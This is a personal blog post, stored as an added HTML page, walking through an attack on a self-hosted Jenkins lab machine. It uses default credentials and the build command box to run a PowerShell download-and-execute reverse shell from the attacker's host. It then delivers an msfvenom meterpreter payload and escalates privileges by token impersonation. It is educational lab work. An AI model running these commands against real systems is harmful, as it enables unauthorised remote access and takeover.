@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <meta http-equiv="cache-control" content="max-age=0" />
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="expires" content="0" />
+    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
+    <meta http-equiv="pragma" content="no-cache" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+
+    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
+    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />
+
+    <meta name="description" content="jenkins">
+
+    
+        <title>jenkins | ༧</title>
+    
+
+    
+    <link rel="stylesheet" type="text/css" href="/style.min.50e5dce6bdbdda9c021bb01730b34c1639e90db55e0fd1ed0f37771832d1ce47.css" media="all">
+  </head>
+
+  <body>
+        
+        <nav>
+          <ul class="menu">
+            
+                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
+            
+          </ul>
+        </nav>
+        
+
+
+
+<div id="single-header">
+  <h1>
+    jenkins
+  </h1>
+  <div id="single-meta">
+    
+    
+        <span class="datesub">jan 8, 2022 &nbsp;&nbsp; m. jan 10, 2024</span>
+      
+
+  </div>
+</div>
+
+
+<div class="content-container">
+  
+
+  <main><p>if you&rsquo;ve worked in any sort of SaaS/tech company, odds are you&rsquo;ve used a CI/CD (continuous integration/continuous delivery and deployment) and DevOps tool. CI/CD is a method used to deliver apps to customers and clients by introducing automation into the stages of app development. it allows orgs to ship software &ldquo;quickly&rdquo; and &ldquo;efficiently&rdquo; (i used scare quotes because&hellip;well, if you&rsquo;ve worked in a software company you&rsquo;ll know why). i&rsquo;m going to see if i can try to exploit a common security misconfiguration on one of these tools, jenkins, then try to escalate privilege to get full system access.</p>
+<h2 id="the-difference-between-ci-and-cd">the difference between CI and CD</h2>
+<p><strong>CI</strong>: involves devs making small changes and checks to their code. the scale of these changes can be huge so the process is automated to ensure that teams can build, test, and package their apps in a reliable way. CI can also help to streamline code changes.</p>
+<p><strong>CD (continuous delivery)</strong>: this is the automated delivery of completed code to environments like testing and development.</p>
+<p><strong>CD (continuous deployment)</strong>: every change that passes the automated tests is automatically placed in production, resulting in many production deployments. this is the ultimate goal of many companies, given they&rsquo;re not constrained by regulatory or compliance requirements.</p>
+<p><p class="imgp">
+  <img loading="lazy" src="/CICD-DevOps.png" alt="cicd"  />
+</p>
+</p>
+<h2 id="jenkins">jenkins</h2>
+<p>jenkins is an open-source CI/CD automation software, written in java. it&rsquo;s used to implement CI/CD workflows, called pipelines.</p>
+<p>pipelines automate testing and reporting on isolated changes in a larger code base (in real time) and facilitates integration of disparate branches of code into a main branch. pipelines also rapidly detect defects in a code base, build the software, automate testing of builds, prepare code base for deployment/delivery, and ultimately deploy code to containers and virtual machines (as well as bare metal and cloud servers).</p>
+<p>for this experiment, i&rsquo;ve spun up a windows VM that hosts the jenkins instance, and try to attack it from my kali VM.</p>
+<p>once everything is set up, let&rsquo;s start with a simple nmap scan of the target machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>nmap -sT -Pn -v 10.10.77.68
+</span></span></code></pre></div><p><p class="imgp">
+  <img loading="lazy" src="/jenkins-nmap.png" alt="nmap"  />
+</p>
+</p>
+<p>the service at port 8080 is the jenkins server. to visit it, simply enter http://10.10.77.68:8080. at the login page, i&rsquo;ll enter my credentials (admin:admin) [note: default credentials for jenkins are usually admin:password or admin:admin] and be taken to the jenkins dashboard. there you&rsquo;ll see a &ldquo;project&rdquo; that was created just for this experiment.</p>
+<p><p class="imgp">
+  <img loading="lazy" src="/jenkins-dashboard.png" alt="dashboard"  />
+</p>
+</p>
+<p>since this is a windows application, i&rsquo;ll use the <a href="https://github.com/samratashok/nishang"  target="_blank" rel="noreferrer nofollow">nishang</a>
+ repo for a script, more specifically <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1"  target="_blank" rel="noreferrer nofollow">this</a>
+ reverse shell script. nishang also contains a whole bunch of scripts for initial access, enumeration, and privesc so check them all out if you&rsquo;d like.</p>
+<p>in kali, i created a directory to download the script to.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+</span></span></code></pre></div><p>now let&rsquo;s create a simple web server so that this script can be downloaded into jenkins.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python -m SimpleHTTPServer 80
+</span></span></code></pre></div><p>back in jenkins, if you click &ldquo;project&rdquo; &gt; configure &gt; build, you&rsquo;ll see a command box that lets you execute any command.</p>
+<p><p class="imgp">
+  <img loading="lazy" src="/jenkins-build.png" alt="build"  />
+</p>
+</p>
+<p>first, start a netcat listener in kali.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>nc -lvnp 9001
+</span></span></code></pre></div><p>in the jenkins command box, enter the following command to download the powershell script to the target. remember to use the address of the HTTP server that was created.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>powershell iex (New<span style="color:#ff79c6">-</span>Object Net<span style="color:#ff79c6">.</span>WebClient)<span style="color:#ff79c6">.</span>DownloadString(<span style="color:#f1fa8c">&#39;http://10.9.4.75:80/Invoke-PowerShellTcp.ps1&#39;</span>);Invoke<span style="color:#ff79c6">-</span>PowerShellTcp <span style="color:#ff79c6">-</span>Reverse <span style="color:#ff79c6">-</span>IPAddress <span style="color:#bd93f9">10.9</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">4.75</span> <span style="color:#ff79c6">-</span>Port <span style="color:#bd93f9">9001</span>
+</span></span></code></pre></div><p>save the build, then click &ldquo;build now&rdquo; from the project page. the netcat listener will receive a connection to the target.</p>
+<p><p class="imgp">
+  <img loading="lazy" src="/jenkins-netcat.png" alt="netcat"  />
+</p>
+</p>
+<p>to make privesc easier, it&rsquo;s better to switch to a meterpreter shell.</p>
+<p>first, create an msfvenom payload in the same directory we saved the powershell script to.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.4.75 LPORT=9002 -f exe -o jenkins.exe
+</span></span></code></pre></div><p>download it to the machine similar to how we did it before, via the HTTP server and the build command box.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>powershell <span style="color:#f1fa8c">&#34;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.9.4.75:8000/jenkins.exe&#39;,&#39;jenkins.exe&#39;)&#34;</span>
+</span></span></code></pre></div><p>save this build, but before building, let&rsquo;s create a handler in metasploit to receive the connection.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&gt; use exploit/multi/handler
+</span></span><span style="display:flex;"><span>&gt; set PAYLOAD windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>&gt; set LHOST 10.9.4.75
+</span></span><span style="display:flex;"><span>&gt; set LPORT 9002
+</span></span><span style="display:flex;"><span>&gt; run
+</span></span></code></pre></div><p>back in jenkins, once you build and the payload has been downloaded to target, in the msfconsole shell type the following to get the meterpreter shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&gt; Start-Process &#34;jenkins.exe&#34;
+</span></span></code></pre></div><h2 id="token-impersonation-to-gain-system-access">token impersonation to gain system access</h2>
+<p>windows uses tokens to ensure accounts have the right privileges to carry out certain actions. tokens are assigned to an account when users log in or when they&rsquo;re authenticated. this is usually done by <code>LSASS.exe</code>, generates the process responsible for authenticating users for the WINLOGON service. this is performed by using authentication packages like <code>msgina.dll</code>.</p>
+<p>once authentication is successful, LSASS generates the user&rsquo;s access token, which is used to launch the initial shell. other processes the user initiates then inherit this token.</p>
+<p>the user&rsquo;s access token consists of: user SIDs, group SIDs, privileges. you can read more about access tokens <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens"  target="_blank" rel="noreferrer nofollow">here</a>
+.</p>
+<p>there are 2 types of access tokens:</p>
+<ol>
+<li>primary access tokens: associated with a user account, generated on log on</li>
+<li>impersonation tokens: allow a particular process to use the token of another</li>
+</ol>
+<p>the different levels of impersonation tokens:</p>
+<ul>
+<li><strong>SecurityAnonymous</strong>: current user/client cannot impersonate another user/client</li>
+<li><strong>SecurityIdentification</strong>: current user/client can get the identity and privileges of a client, but cannot impersonate the client</li>
+<li><strong>SecurityImpersonation</strong>: current user/client can impersonate the client&rsquo;s security context on the local system</li>
+<li><strong>SecurityDelegation</strong>: current user/client can impersonate the client&rsquo;s security context on a remote system</li>
+</ul>
+<p>security context refers to the data structure that contain users&rsquo; relevant security information.</p>
+<p>privileges of an account allow the user to carry out particular actions.
+the most commonly abused privileges are:</p>
+<ul>
+<li>SeImpersonatePrivilege</li>
+<li>SeAssignPrimaryPrivilege</li>
+<li>SeTcbPrivilege</li>
+<li>SeBackupPrivilege</li>
+<li>SeRestorePrivilege</li>
+<li>SeCreateTokenPrivilege</li>
+<li>SeLoadDriverPrivilege</li>
+<li>SeTakeOwnershipPrivilege</li>
+<li>SeDebugPrivilege</li>
+</ul>
+<p>you can read more about them <a href="https://www.exploit-db.com/papers/42556"  target="_blank" rel="noreferrer nofollow">here</a>
+.</p>
+<p>back in the meterpreter shell, we can check privs easily.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&gt; whoami /priv
+</span></span></code></pre></div><p>2 privileges should show up: SeDebugPrivilege and SeImpersonatePrivilege. let&rsquo;s use incognito mode to exploit this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">load</span> incognito
+</span></span></code></pre></div><p>to check which tokens are available to us:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&gt; list_tokens -g
+</span></span></code></pre></div><p>the token <strong>BUILTIN\Administrators</strong> is available. impersonating it should be easy.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&gt; impersonate_token &#34;BUILTIN\Administrators&#34;
+</span></span></code></pre></div><p>it&rsquo;s good practice to double check privileges.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&gt; getuid
+</span></span></code></pre></div><p>although we now have a higher privilege token, we may not actually have higher privilege permissions. windows uses a primary token of the process and not the impersonated token to determine what the process can do. so, we just migrate to a process with correct permissions. the safest process to pick is usually <code>services.exe</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&gt; ps
+</span></span><span style="display:flex;"><span>&gt; migrate &lt;PID&gt;
+</span></span></code></pre></div><p>we&rsquo;ve now migrated to an elevated process using its process ID (PID).</p>
+<p>so, there it is. we exploited jenkins to further exploit security misconfigurations to get root access on the target system. pretty cool!</p>
+</main>
+</div>
+
+
+
+
+
+<footer>
+  <div class="footer-nav">
+    
+    <a class="next" href="/posts/gatekeeper/" style="float: right"
+      >next: gatekeeper (buffer overflows)</a
+    >
+     
+    <a class="previous" href="/posts/update/">previous</a>
+    
+  </div>
+</footer>
+
+
+
+<script defer>
+  document.addEventListener("keydown", function (e) {
+    if (document.activeElement.isContentEditable) {
+      return false;
+    }
+    if (document.activeElement.tagName == "INPUT") {
+      return false;
+    }
+    if (e.altKey || e.ctrlKey || e.shiftKey) {
+      return false;
+    }
+    var key = e.key;
+    if (key === "h") {
+      e.preventDefault();
+      e.stopPropagation();
+      window.location.href = "/";
+    } else if (key === "t") {
+      e.preventDefault();
+      e.stopPropagation();
+      window.location.href = `https://${location.hostname}/tags`;
+    } else if (key === "i") {
+      e.preventDefault();
+      e.stopPropagation();
+      const inputs = document.querySelectorAll("input");
+      for (let i = 0; i < inputs.length; i++) {
+        if (inputs[i].offsetParent !== null) {
+          inputs[i].selectionStart = inputs[i].selectionEnd =
+            inputs[i].value.length;
+          inputs[i].focus();
+          break;
+        }
+      }
+    }
+    return false;
+  });
+</script>
+
+
+<script defer>
+  function throttle(fn, wait) {
+    var time = Date.now();
+    return function () {
+      var now = Date.now()
+      if (time + wait - now < 0) {
+        fn();
+        time = now;
+      }
+    };
+  }
+
+  function scrollHandler() {
+    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));
+
+    function scrollCallback() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+
+      
+      for (var i = 0; i < anchors.length; i++) {
+        var anchorId = anchors[i].getAttribute("id");
+        var link = document.querySelector(
+          'nav ul li a[href="#' + anchorId + '"]',
+        );
+        if (link) {
+          link.classList.remove("active-toc");
+        }
+      }
+
+      
+      for (var i = anchors.length - 1; i >= 0; i--) {
+        var offsetTop = anchors[i].offsetTop;
+        if (scrollTop > offsetTop - 75) {
+          var anchorId = anchors[i].getAttribute("id");
+          var link = document.querySelector(
+            'nav ul li a[href="#' + anchorId + '"]',
+          );
+          if (link) {
+            link.classList.add("active-toc");
+            break;
+          }
+        }
+      }
+    }
+
+    window.addEventListener(
+      "scroll",
+      throttle(scrollCallback, 300),
+    );
+  }
+  setTimeout(scrollHandler, 100);
+</script>
+
+<script defer>
+  function addCopyButtonToCodeBlocks() {
+    
+    const codeBlocks = document.querySelectorAll('code[class^="language-"]');
+
+    codeBlocks.forEach((codeBlock) => {
+      const copyButton = document.createElement("button");
+      copyButton.classList.add("copy-code-button");
+      copyButton.innerHTML = "copy";
+
+      
+      copyButton.addEventListener("click", () => {
+        
+        const elements = codeBlock.querySelectorAll(".cl");
+        let codeToCopy = "";
+        elements.forEach((element) => {
+          codeToCopy += element.innerText;
+        });
+        navigator.clipboard.writeText(codeToCopy);
+
+        
+        copyButton.innerHTML = "copied!";
+        setTimeout(() => {
+          copyButton.innerHTML = "copy";
+        }, 1500);
+      });
+
+      
+      codeBlock.parentNode.before(copyButton);
+    });
+  }
+  setTimeout(function () {
+    addCopyButtonToCodeBlocks();
+  }, 100);
+</script>
